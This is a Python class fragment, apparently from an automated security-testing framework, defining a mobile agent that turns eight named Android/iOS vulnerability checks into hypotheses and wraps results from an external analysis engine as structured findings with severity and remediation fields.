    RELEVANT_LABEL_KEYWORDS = ["mobile", "apk", "ipa", "android", "ios"]

    _MOBILE_CHECKS = [
        ("ssl_pinning_bypass",      "SSL pinning may be bypassable via Frida hook",         0.65),
        ("root_detection_bypass",   "Root detection may be circumventable",                  0.70),
        ("hardcoded_secrets",       "APK DEX may contain hardcoded credentials/API keys",    0.58),
        ("exported_components",     "Exported Android components lack permission checks",    0.62),
        ("insecure_storage",        "Sensitive data stored in plaintext SharedPrefs/SQLite", 0.52),
        ("deeplink_injection",      "Deep link handler processes untrusted input",           0.47),
        ("webview_js_enabled",      "WebView with JavaScript enabled loads remote content",  0.55),
        ("insecure_network",        "App communicates over HTTP or ignores cert errors",     0.60),
    ]

    def __init__(self, **kwargs):
        super().__init__(AgentType.MOBILE, **kwargs)
        self._mobile_engine = None
        try:
            from mobile_security_engine import MobileSecurityEngine
            self._mobile_engine = MobileSecurityEngine()
        except Exception:
            pass

    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
        apk_id = context.get("apk_id")
        if not apk_id:
            return []
        return [
            Hypothesis(
                hypothesis_id = uuid.uuid4().hex[:8],
                agent_type    = self.agent_type,
                target_node   = apk_id,
                attack_vector = f"mobile_{check}",
                confidence    = self.memory.rate(f"mobile_{check}", default_conf),
                payload       = check,
                context       = {"apk_id": apk_id, "check": check},
                reasoning     = reasoning,
                priority      = default_conf,
            )
            for check, reasoning, default_conf in self._MOBILE_CHECKS
        ]

    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
        findings: List[AgentFinding] = []
        if not self._mobile_engine:
            return findings
        apk_id = context.get("apk_id")
        if not apk_id:
            return findings
        try:
            loop    = asyncio.get_event_loop()
            results = await loop.run_in_executor(
                None, lambda: self._mobile_engine.analyze(apk_id)
            )
            for r in (results or []):
                findings.append(self._finding(
                    target    = apk_id,
                    vuln_type = r.get("type", "mobile_vuln"),
                    severity  = r.get("severity", "medium"),
                    title     = r.get("title", "Mobile Security Issue"),
                    description = r.get("description", ""),
                    payload   = r.get("payload", ""),
                    evidence  = r.get("evidence", ""),
                    cvss      = r.get("cvss", 5.0),
                    confidence= r.get("confidence", 0.70),
                    reproduced= False,
                    chain_potential = r.get("chain_potential", []),
                    remediation = r.get("remediation", ""),
                ))
        except Exception as exc:
            logger.debug("[%s] Mobile test error: %s", self.name, exc)
        return findings


